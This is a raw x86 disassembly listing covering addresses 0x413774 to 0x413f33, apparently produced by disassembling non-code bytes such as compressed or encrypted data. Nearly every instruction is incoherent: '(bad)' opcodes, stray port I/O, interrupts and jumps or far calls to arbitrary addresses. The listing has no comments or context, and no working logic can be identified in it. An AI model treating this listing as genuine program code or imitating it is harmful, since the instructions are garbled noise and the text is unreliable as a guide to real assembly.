  413774:	jnp    0x41373a
  413776:	cwde   
  413777:	mov    BYTE PTR [esp+eiz*8],ch
  41377a:	sub    ecx,esi
  41377c:	mov    BYTE PTR [ecx],dl
  41377e:	inc    edx
  41377f:	jmp    0xe72bf5cb
  413784:	into   
  413785:	fisttp DWORD PTR [esi-0x3859b467]
  41378b:	inc    esi
  41378c:	popf   
  41378d:	xchg   edi,eax
  41378e:	ins    BYTE PTR es:[edi],dx
  41378f:	and    bh,BYTE PTR [esi]
  413791:	test   DWORD PTR [esi+esi*4],0xf2e464c3
  413798:	lods   eax,DWORD PTR ds:[esi]
  413799:	(bad)  
  41379a:	retf   0x3561
  41379d:	ins    DWORD PTR es:[edi],dx
  41379e:	pop    esp
  41379f:	cmc    
  4137a0:	(bad)  
  4137a1:	shl    BYTE PTR [esi+esi*4+0xed8e702],1
  4137a8:	mov    ah,0xe7
  4137aa:	jmp    0x4137bd
  4137ac:	push   esp
  4137ad:	adc    ebx,DWORD PTR cs:[esp+eax*1]
  4137b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137b2:	outs   dx,DWORD PTR ds:[esi]
  4137b3:	test   BYTE PTR [eax+0x6769b01f],0xa4
  4137ba:	mov    ebx,0xd7d3a2cd
  4137bf:	dec    eax
  4137c0:	cmp    eax,0x94997804
  4137c5:	mov    cs,WORD PTR [edx]
  4137c7:	cmp    DWORD PTR [edx-0x66],ebx
  4137ca:	xchg   ecx,eax
  4137cb:	stos   DWORD PTR es:[edi],eax
  4137cc:	add    eax,0xe7baf5bd
  4137d1:	sub    DWORD PTR [edx],0x9bc3d0c9
  4137d7:	iret   
  4137d8:	loop   0x413817
  4137da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137db:	mov    esp,0x6f87f58b
  4137e0:	jns    0x4137d9
  4137e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137e3:	sbb    ebp,DWORD PTR [eax+0x4b]
  4137e6:	outs   dx,DWORD PTR ds:[esi]
  4137e7:	sbb    eax,0xafb1c3e6
  4137ec:	out    0x31,al
  4137ee:	dec    ecx
  4137ef:	sbb    BYTE PTR [ebx-0x10],al
  4137f2:	pop    edx
  4137f3:	mov    al,0x3a
  4137f5:	cmp    DWORD PTR [ecx-0x65],0xbc6ce53b
  4137fc:	sub    al,0xb9
  4137fe:	push   ebp
  4137ff:	or     ah,BYTE PTR [edx-0x30]
  413802:	push   eax
  413803:	add    al,0x30
  413805:	(bad)  
  413806:	test   edi,0xa0e2e3cc
  41380c:	retf   0xb139
  41380f:	adc    DWORD PTR [ebx+0x7b],ecx
  413812:	test   eax,0xc281c80b
  413817:	and    al,0xe1
  413819:	lahf   
  41381a:	or     al,0x9c
  41381c:	mov    dl,0x2b
  41381e:	cmp    bh,BYTE PTR ds:0xd66f8265
  413824:	push   ebp
  413825:	fnsave [ecx]
  413827:	icebp  
  413828:	neg    DWORD PTR [esp+ecx*1]
  41382b:	sub    al,0x9c
  41382d:	mov    eax,0x39eeed64
  413832:	(bad)  [edx+edi*2+0x16676f95]
  413839:	popa   
  41383a:	in     al,0x30
  41383c:	pusha  
  41383d:	mov    DWORD PTR [ebx+0x73],edx
  413840:	jp     0x41389e
  413842:	xchg   ebp,eax
  413843:	jns    0x413840
  413845:	push   esp
  413846:	imul   BYTE PTR [edi+0x2b]
  413849:	jbe    0x41387d
  41384b:	icebp  
  41384c:	mov    eax,0xf7268bdb
  413851:	xchg   DWORD PTR [esi+eax*8],esp
  413854:	retf   
  413855:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413856:	pushf  
  413857:	and    al,0x5f
  413859:	retf   
  41385a:	sahf   
  41385b:	daa    
  41385c:	and    ebx,esi
  41385e:	int3   
  41385f:	and    dh,BYTE PTR [edx-0x2f]
  413862:	jae    0x4138ce
  413864:	popa   
  413865:	sbb    DWORD PTR [esi],ebp
  413867:	stc    
  413868:	jge    0x41383f
  41386a:	push   esp
  41386b:	cmp    bl,dl
  41386d:	enter  0x15d5,0x70
  413871:	sbb    esp,DWORD PTR [edi-0x18fda8f9]
  413877:	xchg   ebp,eax
  413878:	xchg   BYTE PTR [esi],bl
  41387a:	stos   BYTE PTR es:[edi],al
  41387b:	mov    ebx,0xe5dd19d7
  413880:	out    dx,al
  413881:	fisttp DWORD PTR [ecx-0x76]
  413884:	sub    edi,esp
  413886:	mov    fs,WORD PTR [ebp+ebx*1+0x2383eef2]
  41388d:	pop    si
  41388f:	inc    esi
  413890:	inc    esi
  413891:	in     al,dx
  413892:	(bad)  
  413893:	sahf   
  413894:	dec    ecx
  413895:	or     al,0x58
  413897:	mov    eax,0xea24056e
  41389c:	js     0x41391c
  41389e:	inc    ecx
  41389f:	inc    ebp
  4138a0:	(bad)  
  4138a1:	push   ebp
  4138a2:	mov    eax,DWORD PTR [ecx-0x42]
  4138a5:	leave  
  4138a6:	push   edx
  4138a7:	and    al,0x81
  4138a9:	test   al,0xe7
  4138ab:	sti    
  4138ac:	push   ebp
  4138ad:	jo     0x4138c9
  4138af:	inc    ecx
  4138b0:	ins    BYTE PTR es:[edi],dx
  4138b1:	and    BYTE PTR [edi+0x42],0x39
  4138b5:	mov    ch,0xc5
  4138b7:	push   es
  4138b8:	or     esi,DWORD PTR [eax+esi*8]
  4138bb:	jno    0x413886
  4138bd:	loopne 0x4138dd
  4138bf:	(bad)  
  4138c0:	int    0x39
  4138c2:	xchg   esi,eax
  4138c3:	stc    
  4138c4:	sub    BYTE PTR [ebp-0x5d],al
  4138c7:	mov    dh,0xbb
  4138c9:	jo     0x41387d
  4138cb:	repnz mov fs,ebx
  4138ce:	aam    0xea
  4138d0:	xor    al,0x7e
  4138d2:	and    ah,BYTE PTR [ebx+ebx*4+0x5df79b63]
  4138d9:	mov    dh,0x8d
  4138db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138dc:	sbb    edx,DWORD PTR [ecx+0x3ec14acf]
  4138e2:	sub    al,0xdc
  4138e4:	in     al,0xd6
  4138e6:	cwde   
  4138e7:	(bad)  
  4138e8:	adc    eax,0xe07e7af0
  4138ed:	push   ds
  4138ee:	xchg   BYTE PTR [ebp+0xd],bh
  4138f1:	mov    ds:0x28aafa38,al
  4138f6:	int    0xe9
  4138f8:	out    0x45,al
  4138fa:	mov    BYTE PTR [edx-0x1a349b58],ch
  413900:	inc    ebp
  413901:	leave  
  413902:	pop    ebx
  413903:	ds loope 0x4138fb
  413906:	push   es
  413907:	je     0x41396c
  413909:	xchg   esi,eax
  41390a:	ins    BYTE PTR es:[edi],dx
  41390b:	imul   esp,DWORD PTR [edx-0x6144bfcf],0xe53e4a78
  413915:	mov    bl,0x9
  413917:	and    ecx,DWORD PTR [esi]
  413919:	pop    ss
  41391a:	ror    BYTE PTR [esi],cl
  41391c:	shl    DWORD PTR [eax+esi*8+0x2d],cl
  413920:	arpl   WORD PTR [ecx-0x17e4be1d],ax
  413926:	loop   0x41392e
  413928:	cmp    edi,DWORD PTR [edx]
  41392a:	mov    eax,0x2e1baf02
  41392f:	push   edi
  413930:	xor    BYTE PTR [edx+0x666b68ae],cl
  413936:	inc    esi
  413937:	fwait
  413938:	mov    al,ds:0x66a80a0d
  41393d:	stos   BYTE PTR es:[edi],al
  41393e:	push   0x2
  413940:	sti    
  413941:	in     al,0x5f
  413943:	jns    0x41391c
  413945:	sub    bl,dh
  413947:	test   BYTE PTR [ebx],0xd6
  41394a:	rcr    bh,cl
  41394c:	or     al,0x39
  41394e:	jle    0x41395f
  413950:	(bad)  
  413951:	mov    esp,0x77866b9a
  413956:	and    DWORD PTR [esi+0x46324755],eax
  41395c:	inc    edi
  41395d:	(bad)  
  41395e:	jns    0x4138f5
  413960:	fbld   TBYTE PTR [edx-0x27355b97]
  413966:	adc    esi,DWORD PTR [ebx-0x5a]
  413969:	mov    esp,DWORD PTR [edi]
  41396b:	inc    edi
  41396c:	xlat   BYTE PTR ds:[ebx]
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	xchg   esp,eax
  41396f:	not    DWORD PTR [ebx+0xc6d4015]
  413975:	push   edi
  413976:	call   0xae2a1be0
  41397b:	je     0x413971
  41397d:	pop    edi
  41397e:	cli    
  41397f:	xchg   esi,eax
  413980:	adc    eax,0xa304cd0b
  413985:	xchg   ecx,eax
  413986:	xor    al,0x7b
  413988:	(bad)  
  413989:	xchg   ebp,eax
  41398a:	mov    bh,0xb3
  41398c:	mov    esp,0xff896e5f
  413991:	dec    edi
  413992:	xor    BYTE PTR [esi+0x599ff438],dh
  413998:	jp     0x4139ba
  41399a:	jae    0x413984
  41399c:	sbb    ebx,edx
  41399e:	test   BYTE PTR [ebp+0x63],al
  4139a1:	or     ecx,DWORD PTR [edx]
  4139a3:	sti    
  4139a4:	jmp    0x608881a3
  4139a9:	inc    ecx
  4139aa:	mov    esp,0xc0872b9e
  4139af:	mov    ch,0x7a
  4139b1:	dec    ebx
  4139b2:	das    
  4139b3:	ror    BYTE PTR [esi-0x5e],cl
  4139b6:	pusha  
  4139b7:	push   ecx
  4139b8:	stos   BYTE PTR es:[edi],al
  4139b9:	mov    dl,0x88
  4139bb:	sub    dh,al
  4139bd:	out    0x91,al
  4139bf:	test   al,0xd6
  4139c1:	in     eax,dx
  4139c2:	popf   
  4139c3:	out    dx,eax
  4139c4:	jb     0x413956
  4139c6:	fincstp 
  4139c8:	pop    esi
  4139c9:	fcomp  DWORD PTR [edi]
  4139cb:	xor    eax,0x8d8723a1
  4139d0:	cmc    
  4139d1:	loopne 0x413a2c
  4139d3:	ss and eax,0xf60a907a
  4139d9:	fild   DWORD PTR [ebx-0x21]
  4139dc:	mov    al,ds:0xc247f480
  4139e1:	cdq    
  4139e2:	sub    DWORD PTR [ecx+0x48],eax
  4139e5:	cwde   
  4139e6:	call   0x74e2:0x843abbb5
  4139ed:	in     al,0x16
  4139ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f0:	imul   eax,DWORD PTR [eax-0x11],0x852d091c
  4139f7:	bound  ecx,QWORD PTR [ebx+0x54]
  4139fa:	je     0x4139ea
  4139fc:	aad    0x83
  4139fe:	loopne 0x4139ba
  413a00:	cmp    dl,BYTE PTR [ebx]
  413a02:	inc    edx
  413a03:	bound  ebp,QWORD PTR [ecx+0x51089af6]
  413a09:	cmp    dl,cl
  413a0b:	mov    ch,0x8d
  413a0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a0e:	inc    edx
  413a0f:	add    al,0x1c
  413a11:	ja     0x413a44
  413a13:	ins    DWORD PTR es:[edi],dx
  413a14:	(bad)  
  413a15:	cmp    eax,0xf40284f4
  413a1a:	dec    ebx
  413a1b:	add    ah,dl
  413a1d:	dec    ebp
  413a1e:	fbstp  TBYTE PTR [ebp-0x37]
  413a21:	test   eax,0xcb1076b6
  413a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a27:	xchg   esp,eax
  413a28:	xor    BYTE PTR [ecx+edx*4+0x3af0184e],ah
  413a2f:	jno    0x4139b1
  413a31:	fsubr  DWORD PTR [esi]
  413a33:	shr    dh,0x86
  413a36:	fwait
  413a37:	cmp    edi,ebp
  413a39:	(bad)  
  413a3a:	in     al,dx
  413a3b:	jg     0x413a8d
  413a3d:	fsubr  st(1),st
  413a3f:	jae    0x413aa3
  413a41:	fsubr  st(5),st
  413a43:	xchg   DWORD PTR [eax+0x6e],ebp
  413a46:	cld    
  413a47:	js     0x413ac0
  413a49:	sahf   
  413a4a:	cdq    
  413a4b:	jle    0x413a6a
  413a4d:	inc    ebp
  413a4e:	or     al,0x24
  413a50:	push   esi
  413a51:	sar    BYTE PTR [edx+ecx*8+0x2678641a],0x91
  413a59:	iret   
  413a5a:	cmp    eax,0xf78b1d2e
  413a5f:	aas    
  413a60:	loopne 0x413a6b
  413a62:	push   esp
  413a63:	in     eax,0xb6
  413a65:	jns    0x413a0a
  413a67:	lock or DWORD PTR [ebx+0x56],0x54
  413a6c:	cwde   
  413a6d:	addr16 jle 0x413a6a
  413a70:	push   esi
  413a71:	push   ds
  413a72:	push   cs
  413a73:	sahf   
  413a74:	dec    edi
  413a75:	clc    
  413a76:	mov    bh,0x9b
  413a78:	bound  esp,QWORD PTR [ecx]
  413a7a:	jmp    0x413a66
  413a7c:	mov    esp,0x36370bfb
  413a81:	icebp  
  413a82:	jnp    0x413a8d
  413a84:	and    DWORD PTR es:[ebp+0x58d5b99e],esp
  413a8b:	into   
  413a8c:	int    0xf1
  413a8e:	cmc    
  413a8f:	jp     0x413a69
  413a91:	std    
  413a92:	ins    DWORD PTR es:[edi],dx
  413a93:	mov    dl,0x5a
  413a95:	pop    edi
  413a96:	pop    edi
  413a97:	in     eax,0xfe
  413a99:	push   0x7a
  413a9b:	std    
  413a9c:	frstor [esi]
  413a9e:	sub    DWORD PTR [eax-0x7a6c39ff],0xfffffff2
  413aa5:	jne    0x413b04
  413aa7:	xchg   ecx,esp
  413aa9:	mov    dh,0xcf
  413aab:	mov    ebp,0x9fb0d5e9
  413ab0:	mov    ds:0x2a962b,al
  413ab5:	lds    esp,FWORD PTR [eax]
  413ab7:	ret    
  413ab8:	stos   DWORD PTR es:[edi],eax
  413ab9:	or     DWORD PTR [ebp-0x404f6760],esi
  413abf:	mov    eax,es
  413ac1:	ins    DWORD PTR es:[edi],dx
  413ac2:	clc    
  413ac3:	dec    DWORD PTR [esi+0x2c56d506]
  413ac9:	mov    bh,0x57
  413acb:	lea    edi,[ecx+eiz*1-0x2d]
  413acf:	or     cl,BYTE PTR [esi]
  413ad1:	js     0x413a8a
  413ad3:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ad5:	mov    ch,0x51
  413ad7:	push   cs
  413ad8:	inc    ecx
  413ad9:	mov    cl,0xeb
  413adb:	dec    ecx
  413adc:	int    0xb8
  413ade:	cmp    al,0x38
  413ae0:	mov    al,BYTE PTR [ebx]
  413ae2:	or     BYTE PTR [ebx-0x12],bh
  413ae5:	cmp    dl,BYTE PTR [esi+0x55]
  413ae8:	cmp    esp,esi
  413aea:	dec    edi
  413aeb:	fbld   TBYTE PTR [edi-0x63]
  413aee:	in     ax,dx
  413af0:	jnp    0x413ada
  413af2:	jo     0x413b27
  413af4:	aaa    
  413af5:	mov    ch,0x8b
  413af7:	fld    TBYTE PTR ds:[ebp+0x16]
  413afb:	je     0x413ae1
  413afd:	mov    esp,esp
  413aff:	mov    edx,0x8b7f9820
  413b04:	xor    BYTE PTR [eax+eiz*4],0x9
  413b08:	mov    WORD PTR [eax+0x57c60c8b],?
  413b0e:	pop    edi
  413b0f:	stos   DWORD PTR es:[edi],eax
  413b10:	xor    al,0x5f
  413b12:	lods   al,BYTE PTR ds:[esi]
  413b13:	push   edi
  413b14:	adc    al,BYTE PTR [ecx-0x437f78c5]
  413b1a:	scas   al,BYTE PTR es:[edi]
  413b1b:	pop    ss
  413b1c:	xchg   edx,eax
  413b1d:	inc    edx
  413b1e:	retf   0x2b39
  413b21:	pushf  
  413b22:	xor    DWORD PTR [ebp-0x29],ebx
  413b25:	jno    0x413b23
  413b27:	jbe    0x413b42
  413b29:	push   esi
  413b2a:	stos   DWORD PTR es:[edi],eax
  413b2b:	pop    edi
  413b2c:	sbb    eax,0xf7b98a35
  413b31:	es jno 0x413b13
  413b34:	mov    ecx,0x76f0baa5
  413b39:	and    eax,0xf75ab202
  413b3e:	test   BYTE PTR [edx-0x35beb119],dl
  413b44:	lods   eax,DWORD PTR ds:[esi]
  413b45:	jmp    0x413aec
  413b47:	fisub  WORD PTR es:[ebp-0x493672a0]
  413b4e:	cmc    
  413b4f:	xor    ch,ah
  413b51:	out    dx,al
  413b52:	push   edx
  413b53:	(bad)  
  413b54:	mov    ebp,0x8e5ad437
  413b59:	scas   al,BYTE PTR es:[edi]
  413b5a:	push   es
  413b5b:	fcom   QWORD PTR [eax-0x3c]
  413b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b5f:	stc    
  413b60:	xor    DWORD PTR [esi+0x49],esi
  413b63:	sbb    BYTE PTR [esi],dh
  413b65:	iret   
  413b66:	cmp    BYTE PTR [edx+0x66],cl
  413b69:	out    0x6f,eax
  413b6b:	inc    edi
  413b6c:	(bad)  
  413b6d:	shl    bl,1
  413b6f:	xchg   edi,eax
  413b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b71:	repz sahf 
  413b73:	xchg   esp,eax
  413b74:	les    ebp,FWORD PTR [edx-0xa8ec1fc]
  413b7a:	mov    ah,0xd4
  413b7c:	xchg   ecx,eax
  413b7d:	and    ah,BYTE PTR [ebp+0x69]
  413b80:	mov    edx,0x57d6394c
  413b85:	popa   
  413b86:	(bad)  
  413b87:	into   
  413b88:	add    ecx,esp
  413b8a:	cld    
  413b8b:	push   0x38223d48
  413b90:	inc    edi
  413b91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b92:	jb     0x413bdf
  413b94:	adc    al,BYTE PTR [edi+0x72]
  413b97:	das    
  413b98:	lds    esp,FWORD PTR [ebp-0x1d5d6a67]
  413b9e:	pop    es
  413b9f:	inc    edx
  413ba0:	cmp    bh,BYTE PTR [edi+0x2722c49f]
  413ba6:	jnp    0x413bd3
  413ba8:	add    DWORD PTR [ecx],eax
  413baa:	xchg   esp,eax
  413bab:	hlt    
  413bac:	jb     0x413b76
  413bae:	mov    al,ds:0x4ca12d8f
  413bb3:	add    edx,DWORD PTR [esp+edi*8+0x27]
  413bb7:	pop    esp
  413bb8:	aaa    
  413bb9:	loopne 0x413bd8
  413bbb:	jbe    0x413c22
  413bbd:	adc    DWORD PTR [ebx+0x39],0xbcb8efea
  413bc4:	jns    0x413b72
  413bc6:	sbb    eax,0x30e1b3ad
  413bcb:	out    dx,eax
  413bcc:	gs add eax,0x32acc9b1
  413bd2:	push   eax
  413bd3:	mov    bh,0xc4
  413bd5:	leave  
  413bd6:	cli    
  413bd7:	mov    bl,0x63
  413bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bda:	call   0x5aa864e2
  413bdf:	loope  0x413bff
  413be1:	mov    ch,0xcb
  413be3:	(bad)  
  413be4:	aad    0xa5
  413be6:	cld    
  413be7:	pop    ds
  413be8:	jno    0x413bff
  413bea:	popf   
  413beb:	mov    cl,BYTE PTR [edi]
  413bed:	repnz loopne 0x413bd0
  413bf0:	sub    al,ah
  413bf2:	mul    BYTE PTR [ebp-0x2f7e5247]
  413bf8:	mov    fs,WORD PTR [ebp+0x2fcd5d1a]
  413bfe:	int3   
  413bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c00:	xor    eax,0x8a792ec8
  413c05:	xlat   BYTE PTR cs:[ebx]
  413c07:	les    esi,FWORD PTR [ebx]
  413c09:	out    dx,eax
  413c0a:	pop    ebp
  413c0b:	stc    
  413c0c:	cmp    ecx,DWORD PTR [edi-0x52]
  413c0f:	mov    esi,0x16091cdc
  413c14:	sub    al,0x25
  413c16:	add    DWORD PTR [eax],ebx
  413c18:	jge    0x413bdf
  413c1a:	daa    
  413c1b:	mov    dl,0x24
  413c1d:	jo     0x413bf3
  413c1f:	int3   
  413c20:	mov    ds:0xdc9e6acb,eax
  413c25:	sub    ah,BYTE PTR [ecx]
  413c27:	ins    DWORD PTR es:[edi],dx
  413c28:	dec    esp
  413c29:	pop    ebx
  413c2a:	retf   0xb296
  413c2d:	and    edi,DWORD PTR [edx]
  413c2f:	pop    esi
  413c30:	(bad)  
  413c31:	jle    0x413c9c
  413c33:	xchg   esp,eax
  413c34:	gs call 0x6ed77625
  413c3a:	xchg   ebx,eax
  413c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c3d:	or     ebx,DWORD PTR [esi]
  413c3f:	retf   0xbe24
  413c42:	push   edx
  413c43:	jmp    edi
  413c45:	pop    ds
  413c46:	and    al,0x9a
  413c48:	or     eax,0x202115e5
  413c4d:	mov    dh,0xda
  413c4f:	mov    dh,0x30
  413c51:	clc    
  413c52:	ror    BYTE PTR [edi+0x1b],1
  413c55:	(bad)  
  413c57:	fcmovne st,st(6)
  413c59:	fldcw  WORD PTR [ebp-0x2955ec68]
  413c5f:	push   esp
  413c60:	dec    esp
  413c61:	mov    cl,0x29
  413c63:	push   edi
  413c64:	and    DWORD PTR [esi],ebp
  413c66:	fdivr  DWORD PTR [ebp-0x33]
  413c69:	lods   eax,DWORD PTR ds:[esi]
  413c6a:	push   ss
  413c6b:	push   edi
  413c6c:	ret    
  413c6d:	das    
  413c6e:	push   es
  413c6f:	fwait
  413c70:	lahf   
  413c71:	jno    0x413bff
  413c73:	sub    eax,DWORD PTR [ecx+0x60]
  413c76:	cmp    ecx,DWORD PTR [esi-0x27]
  413c79:	sbb    al,BYTE PTR [ebx+0x1a]
  413c7c:	adc    ch,BYTE PTR [ebp-0x2c]
  413c7f:	dec    eax
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	fwait
  413c82:	pushf  
  413c83:	mov    dh,0xf6
  413c85:	cli    
  413c86:	sti    
  413c87:	and    esp,DWORD PTR [esi-0x1e]
  413c8a:	mov    WORD PTR [ebp+0x70],es
  413c8d:	daa    
  413c8e:	(bad)  
  413c8f:	fcom   DWORD PTR [si-0x57]
  413c93:	inc    esi
  413c94:	and    ch,BYTE PTR [edi+0x41]
	...
  413d13:	add    BYTE PTR [eax+0x34],ch
  413d16:	fs mov esi,0xf6fafe7c
  413d1c:	mov    bl,0x9d
  413d1e:	aam    0xd4
  413d20:	lods   al,BYTE PTR ds:[esi]
  413d21:	push   edi
  413d22:	mov    al,ds:0xe4447f
  413d27:	add    BYTE PTR [ebx+0x7],ch
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	pop    eax
  413d2d:	call   0xbeff:0x2d31f72b
  413d34:	push   ebx
  413d35:	push   edx
  413d36:	cwde   
  413d37:	sbb    ecx,DWORD PTR [edx]
  413d39:	or     BYTE PTR [eax],al
  413d3b:	sbb    edx,ebp
  413d3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3e:	fistp  WORD PTR [ecx]
  413d40:	jbe    0x413d71
  413d42:	push   ecx
  413d43:	pop    eax
  413d44:	aas    
  413d45:	lods   al,BYTE PTR ds:[esi]
  413d46:	cld    
  413d47:	jle    0x413ce0
  413d49:	dec    ecx
  413d4a:	adc    ch,BYTE PTR [ebx+0x777a9998]
  413d50:	sub    BYTE PTR [ebp+0x27e18c18],bh
  413d56:	hlt    
  413d57:	fistp  QWORD PTR [ebx-0x5404f44e]
  413d5d:	mov    esp,0x80e213d1
  413d62:	rol    ch,1
  413d64:	add    ebx,DWORD PTR ds:[edx-0x7b]
  413d68:	xchg   ebp,eax
  413d69:	mov    dl,0x52
  413d6b:	inc    ecx
  413d6c:	lds    ebp,FWORD PTR [ebp-0x74]
  413d6f:	mov    edx,0xc1ff8c75
  413d74:	or     cl,BYTE PTR [edx]
  413d76:	fwait
  413d77:	and    ch,BYTE PTR [ebp+0xfa21ee5]
  413d7d:	dec    esi
  413d7e:	adc    al,0x1
  413d80:	(bad)  
  413d81:	cmc    
  413d82:	push   ss
  413d83:	pushf  
  413d84:	sbb    DWORD PTR [esp+edx*1-0x4b862289],edx
  413d8b:	mov    dh,0x70
  413d8d:	loope  0x413dd0
  413d8f:	idiv   DWORD PTR [edi-0x436f030d]
  413d95:	das    
  413d96:	in     al,dx
  413d97:	sub    dl,ch
  413d99:	std    
  413d9a:	cld    
  413d9b:	arpl   WORD PTR [esi+0x6fa3a536],sp
  413da1:	inc    eax
  413da2:	xchg   ebp,eax
  413da3:	les    edx,FWORD PTR [esi-0x72]
  413da6:	pop    ds
  413da7:	and    esi,DWORD PTR [edi]
  413da9:	hlt    
  413daa:	jmp    0x413e0a
  413dac:	and    al,al
  413dae:	push   edi
  413daf:	push   ds
  413db0:	push   esi
  413db1:	mov    edx,0xdc89a063
  413db6:	ins    BYTE PTR es:[edi],dx
  413db7:	es loope 0x413d96
  413dba:	sub    eax,DWORD PTR [eax]
  413dbc:	and    eax,0xfc080485
  413dc1:	das    
  413dc2:	jbe    0x413d86
  413dc4:	test   eax,0x80d43dea
  413dc9:	sti    
  413dca:	mov    ecx,0xa7dece87
  413dcf:	jmp    0x413e4f
  413dd1:	ins    DWORD PTR es:[edi],dx
  413dd2:	push   ebp
  413dd3:	and    al,BYTE PTR [edi-0x5]
  413dd6:	pop    edx
  413dd7:	lds    edx,FWORD PTR [esi+0x58]
  413dda:	shl    BYTE PTR [ebp-0x7fe1e76a],1
  413de0:	jbe    0x413df5
  413de2:	mov    ah,0x4
  413de4:	adc    al,0x9e
  413de6:	sub    ecx,esi
  413de8:	mov    ch,0xd6
  413dea:	mov    BYTE PTR [edx+0x63],al
  413ded:	jg     0x413e44
  413def:	add    eax,0x9f66fda3
  413df4:	dec    esp
  413df5:	fstp   TBYTE PTR cs:[edi]
  413df8:	retf   0x6a0e
  413dfb:	push   ebx
  413dfc:	ins    DWORD PTR es:[edi],dx
  413dfd:	loop   0x413e27
  413dff:	out    0xf3,eax
  413e01:	hlt    
  413e02:	ret    0xe495
  413e05:	sub    dl,BYTE PTR ds:0xe64ba746
  413e0b:	daa    
  413e0c:	xor    al,0x6e
  413e0e:	mov    eax,ds:0xbd71b013
  413e13:	add    ebp,DWORD PTR [ebx]
  413e15:	and    bh,bl
  413e17:	dec    esi
  413e18:	sub    esp,DWORD PTR [eax-0xb]
  413e1b:	mov    edi,0xc46c70dc
  413e20:	jb     0x413e15
  413e22:	sbb    BYTE PTR [ecx+0x3abc1734],al
  413e28:	ja     0x413dcd
  413e2a:	add    eax,0xf68f4776
  413e2f:	aad    0x2a
  413e31:	mov    al,0xe5
  413e33:	fldenv [ecx]
  413e35:	mov    dl,0x49
  413e37:	xor    eax,0x6b2fc22c
  413e3c:	sbb    dh,BYTE PTR [esi-0x5d]
  413e3f:	fild   QWORD PTR [ebp+0x1b]
  413e42:	int    0x4d
  413e44:	addr16 mov dh,0x69
  413e47:	out    0x2a,eax
  413e49:	lods   al,BYTE PTR ds:[esi]
  413e4a:	out    0x5e,al
  413e4c:	cmc    
  413e4d:	mov    dh,0x28
  413e4f:	jnp    0x413dd5
  413e51:	pop    ds
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	loopne 0x413e80
  413e55:	in     al,dx
  413e56:	clc    
  413e57:	shl    BYTE PTR [ecx+0x52],1
  413e5a:	push   ebx
  413e5b:	pop    ecx
  413e5c:	or     dl,BYTE PTR [edx]
  413e5e:	js     0x413e53
  413e60:	add    DWORD PTR [edi+0x75],ebx
  413e63:	inc    ebx
  413e64:	sub    BYTE PTR [esi+0x23],bh
  413e67:	cmp    dl,cl
  413e69:	pusha  
  413e6a:	inc    esp
  413e6b:	(bad)  
  413e6d:	mov    edi,0xda03d972
  413e72:	clc    
  413e73:	push   eax
  413e74:	and    DWORD PTR [eax],esp
  413e76:	dec    esp
  413e77:	shr    BYTE PTR [eax-0x53],cl
  413e7a:	jb     0x413e5c
  413e7c:	jns    0x413ea2
  413e7e:	mov    ds:0xd0f98e48,eax
  413e83:	xchg   esp,eax
  413e84:	xchg   esp,eax
  413e85:	sub    DWORD PTR [eax-0x2a],ecx
  413e88:	push   eax
  413e89:	fbld   TBYTE PTR [ebp-0x17cc0085]
  413e8f:	push   esi
  413e90:	(bad)  
  413e91:	mov    ds:0x6b1e9a7a,eax
  413e96:	jne    0x413e28
  413e98:	xor    ebp,DWORD PTR fs:[edx]
  413e9b:	jl     0x413e97
  413e9d:	push   esi
  413e9e:	jae    0x413f00
  413ea0:	pop    es
  413ea1:	add    DWORD PTR ds:0xe227df8d,esp
  413ea7:	jmp    0x413ef4
  413ea9:	adc    bl,BYTE PTR [eax+0x56]
  413eac:	xchg   ebp,eax
  413ead:	adc    BYTE PTR [ecx],dh
  413eaf:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  413eb1:	lods   al,BYTE PTR ds:[esi]
  413eb2:	pmaxsw mm3,mm4
  413eb5:	stos   DWORD PTR es:[edi],eax
  413eb6:	hlt    
  413eb7:	sbb    DWORD PTR [eax],0xffffffcb
  413eba:	and    eax,DWORD PTR [esi-0x23d38e73]
  413ec0:	jmp    0x9de45822
  413ec5:	xor    edx,0xffffffa9
  413ec8:	or     esp,edx
  413eca:	nop
  413ecb:	enter  0xdf51,0x9c
  413ecf:	dec    edx
  413ed0:	dec    edx
  413ed1:	outs   dx,DWORD PTR ds:[esi]
  413ed2:	mov    ebp,0x829d91cf
  413ed7:	mov    edi,0x841fce3
  413edc:	lahf   
  413edd:	jmp    0x413e91
  413edf:	jle    0x413ee0
  413ee1:	cli    
  413ee2:	push   edi
  413ee3:	xor    DWORD PTR [esi-0x48fb11ec],ecx
  413ee9:	dec    esi
  413eea:	addr16 cdq 
  413eec:	add    DWORD PTR [edi+0x322baff1],edi
  413ef2:	loope  0x413ea0
  413ef4:	test   BYTE PTR ds:0x7b54cfe3,bh
  413efa:	push   esi
  413efb:	xor    eax,0x3194069
  413f00:	aad    0x74
  413f02:	pop    DWORD PTR [eax-0x34819e7a]
  413f08:	inc    edi
  413f09:	add    DWORD PTR [edx+edi*1-0x78d2183d],edx
  413f10:	std    
  413f11:	xor    al,0x22
  413f13:	in     al,0x55
  413f15:	mov    edi,ebp
  413f17:	mov    ch,0xaa
  413f19:	adc    DWORD PTR [edi-0x709abaef],0x71177fa7
  413f23:	xchg   ecx,eax
  413f24:	mov    eax,ds:0x4bfc20d2
  413f29:	mov    dh,0xf8
  413f2b:	jmp    0x1034294f
  413f30:	pop    esi
  413f31:	cs fwait
  413f33:	push   cs
